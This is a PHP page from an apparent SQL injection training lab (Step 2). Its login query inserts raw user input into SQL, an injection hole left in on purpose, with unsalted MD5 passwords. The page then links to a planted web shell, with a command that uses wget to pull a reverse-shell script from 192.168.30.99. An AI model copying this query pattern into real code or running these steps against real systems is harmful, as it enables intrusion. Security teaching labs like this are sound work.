<?php

    require 'functions.php';
    require 'config.php';

    $username = $_POST['username'] ?? null;
    $password = $_POST['password'] ?? null;

    $sql = "SELECT * FROM user WHERE username='$username' AND password=MD5('$password')";

    if ($username) {
        $stmt = $db->prepare($sql);
        $stmt->execute();

        // Rather than process login, we're just going to dump output for this example.
        $result = $stmt->fetch();
    
        if ($result) {
            echo "Welcome, ". $result['first_name'] ." ". $result['last_name'] .".";
            exit;
        } else {
            $flash = 'Incorrect username or password';
        }
    }

?>

<html lang="en">
    <head>
        <title>SQL Injection Example</title>
        <link rel="stylesheet" href="css/style.css" />
        <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
    </head>
    <body>
		<div class="container">
            <div class="steps">
                <h2>Step 2</h2>
    		    <h4> Use the newly created script to download a reverse shell</h4>
    		    <p><a href="http://<?= HOST ?>/images/system.php?cmd=wget%20http://192.168.30.99/scripts/reverse-shell.py%20-O%20/tmp/reverse-shell.py" target="_blank">http://<?= HOST ?>/images/system.php?cmd=wget http://192.168.30.99/scripts/reverse-shell.py -O /tmp/reverse-shell.py</a>
            </div>
            <nav>
                <a href="step3.php">Goto step 3</a>
            </nav>
        </div>

        <script>
            window.onload = function() {
              $('em.input').click(function() {
                str = $(this).html();
                $('#password-input').val(str);
              });
            }
        </script>

    </body>
</html>
